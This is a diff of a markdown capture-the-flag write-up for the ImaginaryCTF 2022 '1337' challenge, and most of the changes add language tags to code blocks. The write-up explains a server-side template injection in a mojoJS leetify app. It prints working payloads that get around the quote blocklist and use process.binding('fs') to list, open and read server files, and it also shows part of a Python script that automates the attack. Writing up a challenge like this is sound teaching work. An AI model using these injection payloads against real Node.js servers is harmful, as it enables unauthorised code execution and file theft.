@@ -26,7 +26,7 @@ http://1337.chal.imaginaryctf.org
 <img src="https://github.com/anas-cherni/CTF-writeups/blob/main/Imaginary%20CTF%202022/screenshots/task.png"> <br>
 ### Source Code
 
-```
+```javascript
 import mojo from "@mojojs/core";
 import Path from "@mojojs/path";
 
@@ -129,13 +129,14 @@ app.get("/docker", async (ctx) => {
 app.start();
 ```
 The task was vulnerable to **SSTI** (server side template injection). From the code above it's obvious that it's using mojoJS as template engine :
-```
+```javascript
 import mojo from "@mojojs/core";
 ```
 To test for SSTI existence, we can try to inject "<%=%>" in the input field, and it gives back "undefined" which is the expected nodeJs response.
 #### Problem explained
 Basically, our input is passed through query param "text" to a fct called leetify, along side with "dir" param as arguments. 
-```app.get("/", async (ctx) => {
+```javascript
+app.get("/", async (ctx) => {
   const params = await ctx.params();
   if (params.has("text")) {
     return ctx.render({
@@ -147,7 +148,7 @@ Basically, our input is passed through query param "text" to a fct called leetif
 });
 ```
 Let's dive deep in the fct leetify to see how our input is handled
-```
+```javascript
 const leetify = (text, dir) => {
   const charBlocked = ["'", "`", '"'];
   const charMap = dir === "from" ? fromLeet : toLeet;
@@ -169,7 +170,7 @@ const leetify = (text, dir) => {
   return `<h1>${processed}</h1><a href="/">â†BACK</a>`;
 };
 ```
-```
+```javascript
 const toLeet = {
   A: 4,
   E: 3,
@@ -188,7 +189,7 @@ to make it simple:
 - chars are uppercased
 - ' , " , ` are blacklisted
 - when converting text to LEET code : A becomes 4, E becomes 3 ...
-```
+```javascript
 const toLeet = {
   A: 4,
   E: 3,
@@ -200,7 +201,7 @@ const toLeet = {
 };
 ```
 - when converting back from LEET code we the inverse of to Leet transformation.
-```
+```javascript
 const fromLeet = Object.fromEntries(
   Object.entries(toLeet).map(([k, v]) => [v, k])
 );
@@ -208,12 +209,12 @@ const fromLeet = Object.fromEntries(
 **The whole problem is how to bypass this input handling limitation and execute NodeJs code on the server side to read internal files, flag probably there.**
 ### Solution
 It's better to deal with converting back from leet to text since it's just converting some numbers back to letters. 
-```
+```javascript
 require('fs').readdirSync('.')
 ```
 I tested this on my nodeJs interactive locally and it gives back files in the current directory.
 To bypass quotes blacklist : 
-```
+```javascript
 <%=require(String(/aaaaaaaf/).substring(8,9)+String(/aaaaaaas/).substring(8,9)).readdirSync(String(/aaaaaaa./).substring(8,9))%>
 ```
 Note that I'am using 8 and 9 since they are not converted back to letters according to the list mentioned above.
@@ -221,7 +222,7 @@ Theoretically, we are all good! <br>
 <img src="https://github.com/anas-cherni/CTF-writeups/blob/main/Imaginary%20CTF%202022/screenshots/error.png"> <br>
 mmm weirdoo ! after some testing I concluded that the author is blocking "require" from executing.
 One potential solution that works locally: 
-```
+```javascript
 (()=>{ return process.binding('fs').readdir(".", (err, files) => {}, undefined, undefined, undefined).toString()})()
 ```
 Remember that we are allowed to use 2,8,9 (they re not converted back to letters) so we can automate the attack by:
@@ -230,7 +231,7 @@ Remember that we are allowed to use 2,8,9 (they re not converted back to letters
 - Receiving back the response from the Server.<br>
 **Kudos to my Team mate M0NGI** that came up with the idea! 
 Python code is attached in the repo.
-```
+```python
 from urllib.parse import quote as urlencode
 import requests
 from bs4 import BeautifulSoup
@@ -285,16 +286,16 @@ Finally we can get the flag!  <br>
 - Read files in dir
 
 
-```
+```javascript
  (()=>{ return process.binding('fs').readdir(".", (err, files) => {}, undefined, undefined, undefined).toString()})()
  ```
 
 - open flag --> this will return file descriptor
-```
+```javascript
 (()=>{ let fid = process.binding('fs').open('FL46_7BVY31.7X7', 0, 0o666, undefined, undefined); return fid;})()
 ```
 - read flag <-- put file descriptor as arg in read()
-```
+```javascript
  (()=>{ var buffer = new Buffer(100); process.binding('fs').read(27, buffer, 0, 100, 0, undefined, undefined); return buffer.toString();})()
 ```
  All these payloads should be crafted with the py script that I mentioned above.
